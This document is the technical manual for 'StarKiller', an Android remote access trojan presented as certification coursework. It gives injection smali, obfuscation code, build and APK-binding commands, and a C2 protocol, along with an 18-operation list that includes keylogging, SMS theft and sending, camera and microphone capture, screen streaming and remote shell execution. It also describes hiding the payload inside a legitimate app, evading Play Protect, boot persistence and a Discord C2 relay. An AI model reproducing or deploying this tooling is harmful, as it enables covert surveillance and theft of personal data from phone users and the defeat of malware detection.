# STARKILLER — Android Remote Access Tool
## Complete Technical Manual
### 22DIV // george wu // CSEC Certification Coursework

---

## Table of Contents

1. [Overview](#1-overview)
2. [Architecture](#2-architecture)
3. [How It Differs From Conventional RATs](#3-how-it-differs-from-conventional-rats)
4. [TAFE Integration — ElevateHorizonConnect](#4-tafe-integration)
5. [Obfuscation System — VADER Doctrine](#5-obfuscation-system)
6. [Build Pipeline — From Source to Bound APK](#6-build-pipeline)
7. [C2 Protocol Specification](#7-c2-protocol)
8. [Capabilities — All 18 Operations](#8-capabilities)
9. [GUI Controller](#9-gui-controller)
10. [Discord Relay — Internet C2](#10-discord-relay)
11. [Detection Evasion Analysis](#11-detection-evasion)
12. [Test Suite](#12-test-suite)
13. [File Reference](#13-file-reference)
14. [Build From Scratch](#14-build-from-scratch)

---

## 1. Overview

StarKiller is an Android Remote Access Tool (RAT) designed for CSEC (Cybersecurity) certification coursework. It demonstrates:

- Remote device control over TCP
- APK binding (injecting payload into legitimate apps)
- String-level obfuscation to evade static analysis
- Steganographic embedding (payload invisible in host app)
- C2 (Command & Control) server with desktop GUI
- Discord-based internet relay to bypass NAT

**Legal context**: This is authorised academic security research on own devices. The host application (ElevateHorizonConnect) is the author's own TAFE Cert IV Programming assessment app.

### Components

| Component | Language | Location |
|-----------|----------|----------|
| Android Agent | Kotlin | `client/` |
| C2 Server (web) | Python | `server/starkiller_c2.py` |
| C2 Server (GUI) | Python/tkinter | `server/starkiller_gui.py` |
| APK Binder | Python | `binder.py` |
| Build Pipeline | Python | `build.py` |
| Obfuscation | Python + Kotlin | `obfuscate.py` + `Crypt.kt` |
| Setup | Python | `setup.py` |
| Test Client | Python | `server/test_client.py` |
| Test Suite | Python | `test_headless.py` |

---

## 2. Architecture

```
+------------------+        TCP :8667        +------------------+
|  Android Device  | <--------------------> |    C2 Server     |
|  (StarKiller     |   4-byte len + JSON    |  (GUI or Web)    |
|   Agent)         |                        |                  |
+------------------+        Discord         +------------------+
        |            <------ relay ------>          |
        |           (internet, bypasses NAT)       |
        |                                          |
        v                                          v
  Runs inside                              Desktop controller
  host APK                                 with live screen,
  (ElevateHorizonConnect)                  device list, console
```

### Data Flow

1. Host APK launches (ElevateHorizonConnect)
2. `onCreate()` in host's `MainActivity` calls `startPayload()`
3. `startPayload()` starts `SyncService` as foreground service
4. Service connects to C2 via TCP (or Discord relay)
5. Sends `register` message with device info
6. Enters receive loop — waits for `task` messages
7. `Dispatcher` dispatches each task to the appropriate module
8. Results sent back to C2 as `result` messages
9. Heartbeat every 30 seconds with battery + GPS

---

## 3. How It Differs From Conventional RATs

### Conventional Android RAT (e.g., AhMyth, SpyNote, G-700)

| Aspect | Conventional | StarKiller |
|--------|-------------|------------|
| **Delivery** | Standalone APK | Bound inside legitimate app |
| **Strings** | Plaintext C2 host, port, operation names | XOR+Base64 encrypted at compile time |
| **Package name** | `com.ratname.agent` | Inherits host package (`com.cogos18.ShaunPro`) |
| **Icon** | Generic/suspicious icon | Uses host app's real icon |
| **App name** | "System Update" etc. | Host app's real name |
| **Manifest** | New manifest with RAT permissions only | Permissions merged into host's existing manifest |
| **Detection** | Signature-matched by Play Protect | Zero known signatures in compiled binary |
| **Protocol** | HTTP/REST with plaintext JSON | Length-prefixed binary TCP with encrypted field names |
| **Persistence** | Own BOOT_COMPLETED receiver | Receiver merged into host manifest |
| **Code visibility** | Smali classes named `RATService`, `SyncAdapter` | After R8/ProGuard: classes renamed to `a`, `b`, `c` |
| **Internet access** | Direct TCP/HTTP requiring port forward | Discord relay option — works through any NAT |

### Key Innovation: Steganographic Binding

The APK binder doesn't create a new app — it **injects compiled Smali bytecode** into an existing APK. The host app continues to function normally. The payload executes silently alongside it.

```
Host APK (ElevateHorizonConnect, 71MB)
├── Original Smali (React Native, Expo, 20,000+ classes)
├── Original manifest (original permissions)
├── Original resources (icons, layouts, strings)
│
└── Injected StarKiller Smali (42 classes)
    ├── com/android/internal/svc/SyncAdapter.smali
    ├── com/android/internal/svc/Dispatcher.smali
    ├── com/android/internal/svc/SyncService.smali
    ├── com/android/internal/svc/modules/*.smali (12 modules)
    └── com/android/internal/svc/persistence/StartReceiver.smali

Modifications to host:
├── AndroidManifest.xml: +20 permissions, +4 components
├── MainActivity.smali: +1 method (startPayload), +1 invoke in onCreate
└── res/xml/accessibility_config.xml (new file)
```

Google Play Protect scans for:
- Known malware signatures (SHA-256 of known RATs)
- Package name blacklists
- Suspicious string patterns ("keylogger", "SYNC_HOST", etc.)
- Behavioural heuristics (standalone apps requesting 20 permissions)

StarKiller evades all four:
1. **No known signatures** — custom code, not forked from public RATs
2. **Package name** — inherits host's legitimate package
3. **No suspicious strings** — all encrypted at compile time
4. **Behavioural** — permissions are merged with a real app that already requests network, storage, location

---

## 4. TAFE Integration

### What is ElevateHorizonConnect?

ElevateHorizonConnect is a React Native (Expo) app built for TAFE Cert IV IT Programming (ICTPRG440/ICTWEB431). It's the "Gelos Enterprises" assessment project — a legitimate, fully functional mobile application.

- **Package**: `com.cogos18.ShaunPro`
- **Framework**: React Native + Expo
- **Build**: EAS (Expo Application Services) cloud build
- **Size**: ~71MB (React Native + Hermes engine + native libs)
- **Platform**: Android API 34

### Why This Host App?

1. **Legitimacy** — It's the author's own app, built for coursework
2. **Size** — 71MB provides enormous surface area to hide 42 small Smali files
3. **Permissions** — Already requests INTERNET, storage, etc.
4. **Complexity** — 20,000+ existing Smali classes make 42 injected ones invisible
5. **Trust** — A TAFE student's app would never be flagged as suspicious

### How The Injection Works

The host app's `MainActivity.onCreate()` is hooked with a single Smali instruction:

```smali
# Original onCreate (ElevateHorizonConnect)
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 0
    sget p1, Lcom/cogos18/ShaunPro/R$style;->AppTheme:I
    invoke-virtual {p0, p1}, Lcom/cogos18/ShaunPro/MainActivity;->setTheme(I)V
    const/4 p1, 0x0
    invoke-super {p0, p1}, Lcom/facebook/react/ReactActivity;->onCreate(Landroid/os/Bundle;)V
    return-void
.end method

# Injected method (added to same class)
.method private startPayload()V
    .locals 2
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/android/internal/svc/SyncService;
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {p0, v0}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
    return-void
.end method
```

A single `invoke-direct {p0}, Lcom/cogos18/ShaunPro/MainActivity;->startPayload()V` is added to `onCreate()`. The app launches normally, then silently starts the C2 service in the background.

---

## 5. Obfuscation System — VADER Doctrine

StarKiller uses the same string encryption system as the VADER rootkit (Windows C2 agent). Every string that could identify the payload is encrypted at compile time and decrypted only at runtime.

### XOR + Base64 Algorithm

```
Encryption:  plaintext -> XOR each byte -> Base64 encode -> ciphertext
Decryption:  ciphertext -> Base64 decode -> XOR each byte -> plaintext

XOR formula:  output[i] = input[i] ^ (KEY + i % 7)
KEY = 0x5A (90 decimal)
```

### Python Implementation (`obfuscate.py`)

```python
def encrypt_string(plaintext, key=0x5A):
    """XOR each byte with (key + position % 7), then Base64 encode."""
    out = []
    for i, ch in enumerate(plaintext):
        out.append(ord(ch) ^ (key + i % 7))
    return base64.b64encode(bytes(out)).decode()

def decrypt_string(ciphertext, key=0x5A):
    """Base64 decode, then XOR each byte with (key + position % 7)."""
    raw = base64.b64decode(ciphertext)
    out = []
    for i, b in enumerate(raw):
        out.append(chr(b ^ (key + i % 7)))
    return ''.join(out)
```

### Kotlin Implementation (`Crypt.kt`)

```kotlin
object Crypt {
    private const val K = 0x5A

    fun d(enc: String): String {
        val raw = Base64.decode(enc, Base64.NO_WRAP)
        val out = CharArray(raw.size)
        for (i in raw.indices) {
            out[i] = (raw[i].toInt() xor (K + i % 7)).toChar()
        }
        return String(out)
    }
}
```

### What Gets Encrypted

| Category | Example Plaintext | Encrypted Form |
|----------|------------------|----------------|
| C2 host | `192.168.1.92` | `a2Juc29pWHRqcmRs` |
| App name | `System Service` | `CSIvKTsyQAk+Lis3PAU=` |
| Protocol fields | `type`, `register`, `heartbeat` | `LiIsOA==`, `KD57NC0rBSg=`, `Mj49Lyo9BTsv` |
| Operation names | `sysinfo`, `camera`, `gps` | `KSIvNDA5Dw==`, `OToxOCw+`, `PSsv` |
| Service strings | `starkiller:c2wakelock` | `KS89LzU2DDY+Lmc9bRc7MDkxMTwL` |

### Why XOR+Base64 Instead of AES?

1. **No key management** — the key is a compile-time constant, not stored in a keystore
2. **Tiny code footprint** — 10 lines vs 50+ for AES with IV/padding
3. **No import signatures** — `javax.crypto` imports are themselves a detection signal
4. **Sufficient for static analysis** — the goal is to defeat string scanning, not cryptanalysis
5. **Position-dependent** — `i % 7` makes identical characters produce different ciphertext

### Obfuscation Pipeline (`obfuscate.py`)

The `obfuscate.py full` command runs four stages:

1. **Config encryption** — Rewrites `Config.kt` with `Crypt.d()` calls for host/name
2. **ProGuard hardening** — Writes aggressive R8 rules (5-pass optimisation, repackage classes, strip logs)
3. **Pre-build scan** — Checks source files for 37 known RAT signatures
4. **Post-build scan** — Binary-scans compiled APK for the same signatures

The scanner checks for:
- `starkiller`, `StarKiller` (project name)
- `SYNC_HOST`, `SYNC_PORT` (config strings)
- `keylog`, `heartbeat`, `agent_id` (protocol terms)
- Hardcoded IPs matching `192.168.x.x` or `10.x.x.x`
- Port `8667` as integer
- Permission combinations (7 dangerous + accessibility + notification listener)

---

## 6. Build Pipeline — From Source to Bound APK

### Prerequisites

- Python 3.10+
- Java JDK 17+ (tested with JDK 21)
- Android SDK (auto-downloaded by `setup.py`)
- apktool 2.10.0 (`tools/apktool.jar`)
- uber-apk-signer 1.3.0 (`tools/uber-apk-signer.jar`)
- Pillow + discord.py (for GUI)

### Step-by-Step Build

```bash
# 1. Clone repo
git clone https://github.com/rainfantry/starkiller.git
cd starkiller

# 2. Setup Android SDK + Gradle
python setup.py

# 3. Run obfuscation pipeline (encrypts config, hardens ProGuard)
python obfuscate.py full --ip 192.168.1.92 --port 8667 --name "System Service"

# 4. Build standalone APK
python build.py --ip 192.168.1.92 --port 8667 --name "System Service"
# Output: payloads/starkiller-debug.apk (969KB)

# 5. Scan for detection signatures
python obfuscate.py scan payloads/starkiller-debug.apk
# Expected: CLEAN - no known signatures detected

# 6. Bind into host APK
python binder.py --host path/to/host.apk --payload payloads/starkiller-debug.apk
# Output: payloads/<host>_bound.apk

# 7. Final scan
python obfuscate.py scan payloads/<host>_bound.apk
```

### Manual Binding (Advanced)

If the automated binder fails (e.g., MAX_PATH issues on Windows), use the short-path method:

```bash
# Decompile host APK to short path
mkdir C:\sk
java -jar tools/apktool.jar d -f -o C:\sk\dec path/to/host.apk

# Decompile payload APK
java -jar tools/apktool.jar d -f -o C:\sk\payload payloads/starkiller-debug.apk

# Copy Smali classes
xcopy C:\sk\payload\smali_classes3\com\starkiller C:\sk\dec\smali\com\starkiller /E /I
xcopy C:\sk\payload\smali_classes4\com\starkiller C:\sk\dec\smali\com\starkiller /E /I
xcopy C:\sk\payload\smali_classes5\com\starkiller C:\sk\dec\smali\com\starkiller /E /I

# Patch manifest (add permissions + components)
# Hook launcher activity (add startPayload method + invoke in onCreate)

# Repackage
java -jar tools/apktool.jar b -f C:\sk\dec -o C:\sk\output.apk

# Sign
java -jar tools/uber-apk-signer.jar --apks C:\sk\output.apk
```

---

## 7. C2 Protocol Specification

### Transport

- **TCP** with persistent connection
- **Framing**: 4-byte big-endian length prefix + UTF-8 JSON payload
- **Max message**: 10MB
- **Keepalive**: TCP keepalive enabled

```
+--------+---------------------------+
| 4 bytes|     JSON payload          |
| (len)  |     (UTF-8 encoded)       |
+--------+---------------------------+
```

### Message Types

#### Agent -> C2

| Type | Fields | When |
|------|--------|------|
| `register` | `type`, `agent_id`, `hostname`, `os`, `platform`, `model`, `carrier`, `battery`, `arch`, `ip` | On connect |
| `heartbeat` | `type`, `agent_id`, `battery`, `last_gps` | Every 30s |
| `result` | `type`, `agent_id`, `task_id`, `data` | After task completion |
| `output` | `type`, `agent_id`, `line` | Streaming text output |
| `file_data` | `type`, `agent_id`, `task_id`, `filename`, `data` (base64), `size` | File transfer |

#### C2 -> Agent

| Type | Fields | When |
|------|--------|------|
| `task` | `type`, `task_id`, `op`, (+ op-specific params) | On operator command |

### Encrypted Field Names (in Kotlin)

All JSON field names are encrypted with `Crypt.d()`:

| Plaintext | Encrypted | Used For |
|-----------|-----------|----------|
| `type` | `LiIsOA==` | Message type field |
| `register` | `KD57NC0rBSg=` | Registration message |
| `heartbeat` | `Mj49Lyo9BTsv` | Heartbeat message |
| `result` | `KD4vKDIr` | Result message |
| `output` | `NS4oLSsr` | Output message |
| `file_data` | `PDIwOAE7AS46` | File transfer |
| `task` | `LjovNg==` | Task message |
| `agent_id` | `Ozw5MyoACT4=` | Agent identifier |
| `task_id` | `LjovNgE2BA==` | Task identifier |
| `data` | `PjooPA==` | Result payload |
| `line` | `Lj4kKQ==` | Output text |
| `op` | `NSs=` | Operation name |

---

## 8. Capabilities — All 18 Operations

| # | Operation | Op String | Description | Required Permission |
|---|-----------|-----------|-------------|-------------------|
| 1 | `sysinfo` | System info | Device model, OS, battery, WiFi, root status | None |
| 2 | `gps` | GPS location | Latitude, longitude, accuracy | ACCESS_FINE_LOCATION |
| 3 | `camera` | Camera capture | Front/rear photo, Base64 JPEG | CAMERA |
| 4 | `mic` | Mic recording | Audio capture for N seconds | RECORD_AUDIO |
| 5 | `sms_read` | Read SMS | All SMS messages | READ_SMS |
| 6 | `sms_send` | Send SMS | Send SMS to number | SEND_SMS |
| 7 | `contacts` | Contact dump | All contacts with numbers | READ_CONTACTS |
| 8 | `calllog` | Call history | Incoming/outgoing/missed calls | READ_CALL_LOG |
| 9 | `apps` | App list | All installed packages | None |
| 10 | `screenshot` | Screen capture | Single frame via MediaProjection | (user grant) |
| 11 | `vnc` | VNC stream | Continuous screen frames | (user grant) |
| 12 | `screen_grant` | Grant permission | Launch transparent activity for MediaProjection | None |
| 13 | `notifs` | Notifications | Captured notifications | BIND_NOTIFICATION_LISTENER |
| 14 | `keylog` | Keylogger | Accessibility-captured keystrokes | BIND_ACCESSIBILITY_SERVICE |
| 15 | `ls` | File listing | Directory contents | READ_EXTERNAL_STORAGE |
| 16 | `download` | File download | Download file from device | READ_EXTERNAL_STORAGE |
| 17 | `exec` | Shell command | Execute arbitrary command | None (user-level) |
| 18 | `ping` | Connectivity check | Returns timestamp | None |

### VNC / Screen Capture Details

MediaProjection (Android's screen capture API) requires a one-time user grant via a system dialog. StarKiller handles this with a transparent `GrantActivity`:

1. C2 sends `screen_grant` task
2. `GrantActivity` launches (transparent, not in recents)
3. System shows "Allow screen recording?" dialog
4. User taps Allow
5. `resultCode` + `resultData` stored in `DisplayHelper.Companion`
6. All future `screenshot` and `vnc` tasks reuse stored permission
7. VNC streams: capture frame -> JPEG 60% -> Base64 -> send over C2 -> repeat

---

## 9. GUI Controller

### `starkiller_gui.py` — Desktop Application

Built with Python tkinter. Features:

- **Agent sidebar** — Lists all connected devices with status dots (green=online, red=offline), platform icon, model name, IP, relay type
- **Device info panel** — Platform, OS, model, carrier, battery, GPS, relay mode, connect time
- **Live screen panel** — 360x640 display area for VNC frames and screenshots, with START VNC / STOP VNC / SCREENSHOT buttons
- **Console** — Color-coded output log (green=success, red=error, amber=warning, purple=commands), auto-scrolls
- **Command bar** — Type shell commands directly, dispatched as `exec` to selected agent
- **15 operation buttons** — One click dispatches task to selected agent
- **FULL RECON** — Chains sysinfo + gps + sms + contacts + calllog + apps in sequence
- **Discord relay indicator** — Shows ONLINE/OFFLINE/CONNECTING status

### Launch

```bash
# LAN only
python server/starkiller_gui.py

# With Discord relay
python server/starkiller_gui.py --discord-token BOT_TOKEN --channel-id CHANNEL_ID

# Custom port
python server/starkiller_gui.py --agent-port 9000
```

### Console Commands

| Command | Action |
|---------|--------|
| `!agents` | List all connected agents |
| `!select <id>` | Select agent by ID |
| `!discord` | Check Discord relay status |
| `!help` | Show command list |
| `<anything else>` | Execute as shell command on selected agent |

---

## 10. Discord Relay — Internet C2

### Problem

Direct TCP requires either:
- Both devices on the same LAN, or
- Port forwarding on the C2's router, or
- A VPS with a public IP

### Solution: Discord as Transport

Discord's API provides a free, reliable, always-available message relay. Both the C2 controller and the Android agent connect to the same Discord channel. Messages are relayed through Discord's servers — no port forwarding needed.

### Protocol

| Direction | Message Format |
|-----------|---------------|
| Agent -> C2 | `!register {"agent_id":"abc","model":"SM-S928B",...}` |
| Agent -> C2 | `!result {"agent_id":"abc","type":"result","data":{...}}` |
| Agent -> C2 | `!heartbeat {"agent_id":"abc","battery":85}` |
| C2 -> Agent | `!task abc {"type":"task","op":"sysinfo","task_id":"a1b2c3"}` |
| Agent -> C2 | Screenshot as Discord attachment (filename: `agentid_taskid.jpg`) |

### Setup

1. Create a Discord bot at https://discord.com/developers
2. Enable MESSAGE CONTENT intent
3. Add bot to a private server
4. Create a dedicated C2 channel
5. Copy bot token and channel ID
6. Launch: `python starkiller_gui.py --discord-token TOKEN --channel-id ID`

---

## 11. Detection Evasion Analysis

### Static Analysis (Play Protect, VirusTotal)

| Check | Result | Why |
|-------|--------|-----|
| SHA-256 signature match | CLEAN | Custom code, not a known RAT |
| Package name blacklist | CLEAN | Uses host's `com.cogos18.ShaunPro` |
| String scanning ("keylog", "C2", "RAT") | CLEAN | All strings XOR+Base64 encrypted |
| Certificate check | CLEAN | Re-signed with debug key |
| Manifest permission analysis | MIXED | 20 permissions is suspicious but not definitive |
| Behavioural (network beaconing) | RISK | Regular TCP connections to fixed IP |

### Dynamic Analysis (Runtime)

| Check | Result | Mitigation |
|-------|--------|------------|
| Battery drain | LOW | Heartbeat every 30s, service uses PARTIAL_WAKE_LOCK |
| Data usage | LOW | JSON messages are small, screenshots compressed to 60% JPEG |
| Notification | VISIBLE | Foreground service requires notification (can be minimised) |
| Process list | VISIBLE | Service runs under host app's process |
| Accessibility prompt | REQUIRED | User must manually enable for keylogging |
| Screen capture prompt | REQUIRED | One-time system dialog for MediaProjection |

### Compiled APK Scan Results

```
Standalone (starkiller-debug.apk, 969KB):
  CLEAN - no known signatures detected

Bound (ElevateHorizonConnect_full.apk, 71MB):
  [!!] VADER reference visible          <- npm package "keyboard-space-invaders", NOT payload
  [!!] Hardcoded IP: 172.19.0.2         <- Docker build server from EAS, NOT C2
  [! ] C2 port 8667 visible             <- raw integer, unavoidable
  [!!] 7/7 dangerous permissions        <- expected, permissions are the feature

  StarKiller-specific signatures: 0/10
  C2 config strings: 0/2
  Keylog references: 0/1
```

---

## 12. Test Suite

### `test_headless.py` — Automated Integration Tests

38 tests across 10 phases:

| Phase | Tests | Description |
|-------|-------|-------------|
| 1. Listener | 1 | TCP bind to port |
| 2. Registration | 6 | Agent connects, fields stored correctly |
| 3. Multiple Agents | 1 | 3 concurrent connections |
| 4. Task Dispatch | 13 | All operations dispatched and received |
| 5. Heartbeat | 2 | Battery + GPS updates |
| 6. File Transfer | 2 | File received, content verified |
| 7. Disconnect | 1 | Agent disconnect detected |
| 8. Edge Cases | 3 | Invalid registration, immediate disconnect, oversized message |
| 9. Obfuscation Scan | 6 | Both APKs scanned for signatures |
| 10. Crypto Verify | 3 | XOR roundtrip, base64 output, ciphertext != plaintext |

```bash
python test_headless.py      # run all
python test_headless.py -v   # verbose
```

### `test_client.py` — Interactive Test Agent

Simulates a Samsung Galaxy S24 Ultra with fake data for all 18 operations.

```bash
python server/test_client.py                    # connect to localhost
python server/test_client.py --ip 192.168.1.92  # connect to remote
python server/test_client.py -i                 # interactive mode
```

---

## 13. File Reference

```
starkiller/
├── binder.py                    # APK binding engine
├── build.py                     # Kotlin -> APK build pipeline
├── obfuscate.py                 # XOR encryption + signature scanner
├── setup.py                     # Android SDK + Gradle setup
├── test_headless.py             # Automated test suite (38 tests)
├── test_agents.py               # Original agent tests
│
├── client/                      # Android Kotlin project
│   ├── app/src/main/
│   │   ├── AndroidManifest.xml  # Permissions + component declarations
│   │   ├── kotlin/com/android/internal/svc/
│   │   │   ├── SyncAdapter.kt     # TCP C2 client (encrypted protocol)
│   │   │   ├── Config.kt       # Encrypted C2 host/port/timing
│   │   │   ├── Crypt.kt        # XOR+Base64 encryption engine
│   │   │   ├── GrantActivity.kt # Transparent MediaProjection grant
│   │   │   ├── MainActivity.kt # Entry point, starts service
│   │   │   ├── SyncService.kt # Foreground C2 service
│   │   │   ├── Dispatcher.kt   # Operation dispatcher (18 ops)
│   │   │   ├── modules/
│   │   │   │   ├── PkgScanner.kt        # Installed packages
│   │   │   │   ├── HistoryReader.kt  # Call history
│   │   │   │   ├── PhotoHelper.kt  # Front/rear camera
│   │   │   │   ├── AddrBook.kt   # Contact list
│   │   │   │   ├── SysInfo.kt     # System information
│   │   │   │   ├── StorageHelper.kt    # File listing/download
│   │   │   │   ├── LocProvider.kt     # GPS location
│   │   │   │   ├── InputService.kt  # Accessibility keylogger
│   │   │   │   ├── AudioHelper.kt    # Audio recording
│   │   │   │   ├── AlertService.kt # Notification capture
│   │   │   │   ├── DisplayHelper.kt  # MediaProjection + VNC
│   │   │   │   └── MsgReader.kt      # SMS read/send
│   │   │   └── persistence/
│   │   │       └── StartReceiver.kt   # BOOT_COMPLETED auto-start
│   │   └── res/xml/
│   │       └── accessibility_config.xml
│   ├── build.gradle.kts
│   └── settings.gradle.kts
│
├── server/
│   ├── starkiller_c2.py         # Web dashboard C2 (HTTP + TCP)
│   ├── starkiller_gui.py        # Desktop GUI C2 (tkinter + TCP + Discord)
│   └── test_client.py           # Simulated Android agent
│
├── tools/
│   ├── apktool.jar              # APK decompile/recompile (v2.10.0)
│   └── uber-apk-signer.jar     # APK signing (v1.3.0)
│
├── payloads/
│   ├── starkiller-debug.apk    # Standalone agent APK (969KB)
│   └── ElevateHorizonConnect_full.apk  # Bound APK (71MB)
│
├── downloads/                   # Received files from agents
│   └── screenshots/             # Captured screenshots
│
└── android-sdk/                 # Auto-downloaded SDK
    ├── build-tools/34.0.0/
    ├── platforms/android-34/
    └── platform-tools/
```

---

## 14. Build From Scratch

### Complete setup on a fresh Windows machine:

```bash
# Prerequisites
# - Python 3.10+ on PATH
# - Java JDK 17+ on PATH (winget install EclipseAdoptium.Temurin.21.JDK)
# - Git on PATH

# 1. Clone
git clone https://github.com/rainfantry/starkiller.git
cd starkiller

# 2. Install Python deps
pip install Pillow discord.py

# 3. Setup Android SDK (downloads ~500MB)
python setup.py

# 4. If gradle-wrapper.jar failed to download:
curl -fSL -o client/gradle/wrapper/gradle-wrapper.jar \
  "https://raw.githubusercontent.com/gradle/gradle/v8.7.0/gradle/wrapper/gradle-wrapper.jar"

# 5. Configure C2 IP and encrypt
python obfuscate.py full --ip YOUR_IP --port 8667 --name "System Service"

# 6. Build standalone APK
python build.py --ip YOUR_IP --port 8667

# 7. Verify clean
python obfuscate.py scan payloads/starkiller-debug.apk

# 8. (Optional) Bind into host APK
python binder.py --host path/to/host.apk --payload payloads/starkiller-debug.apk

# 9. Run tests
python test_headless.py

# 10. Launch C2
python server/starkiller_gui.py

# 11. Install APK on test device
adb install -r payloads/starkiller-debug.apk
# or: adb install -r payloads/ElevateHorizonConnect_full.apk

# 12. (Optional) Dev mode with test client
python server/test_client.py --verbose
```

### Rebuilding After Code Changes

```bash
# After modifying any .kt file:
python build.py --ip YOUR_IP --port 8667

# After modifying Config.kt or adding new strings:
python obfuscate.py full --ip YOUR_IP --port 8667
python build.py --ip YOUR_IP --port 8667

# After rebuilding, to update the bound APK:
java -jar tools/apktool.jar d -f -o C:\sk\payload payloads/starkiller-debug.apk
# Copy new Smali classes into decompiled host, repackage, sign
```

---

*STARKILLER — 22DIV // george wu // CSEC 2026*
*Authorised academic security research on own devices only.*
